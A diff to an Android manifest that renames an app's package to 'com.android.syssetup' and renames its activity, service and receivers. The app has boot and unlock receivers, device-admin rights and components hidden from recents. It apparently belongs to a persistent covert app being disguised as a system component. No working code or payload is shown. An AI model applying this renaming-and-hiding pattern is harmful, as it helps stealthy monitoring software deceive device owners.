@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="utf-8"?>
 
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-	package="com.android.dvci" android:versionCode="1"
+	package="com.android.syssetup" android:versionCode="1"
 	android:versionName="1.0">
 	<!-- @CAVEAT@ -->
 	<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
@@ -37,7 +37,7 @@
 	
 	<application android:icon="@drawable/ic_launcher" android:label="@string/app_name" android:debuggable="@DEBUGGABLE@" android:allowBackup="false">
 
-    <activity android:name=".gui.ASG"
+    <activity android:name=".gui.SetGui"
         android:label="@string/app_name" android:excludeFromRecents="true"
         android:enabled="true" android:theme="@android:style/Theme">
         <intent-filter>
@@ -46,14 +46,14 @@
         </intent-filter>
     </activity>
 
-    <service android:name=".ServiceMain" android:exported="false"
+    <service android:name=".SMain" android:exported="false"
         android:excludeFromRecents="true">
         <intent-filter>
-            <action android:name="com.android.dvci.app"/>
+            <action android:name="com.android.syssetup.app"/>
         </intent-filter>
     </service>
 
-    <receiver android:name=".BM">
+    <receiver android:name=".Broad">
         <intent-filter>
             <action android:name="android.intent.action.BOOT_COMPLETED" />
             <action android:name="android.intent.action.USER_PRESENT" />
@@ -61,7 +61,7 @@
     </receiver>
 
     <receiver
-        android:name=".listener.AR"
+        android:name=".listener.AdR"
         android:permission="android.permission.BIND_DEVICE_ADMIN" >
         <intent-filter>
             <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
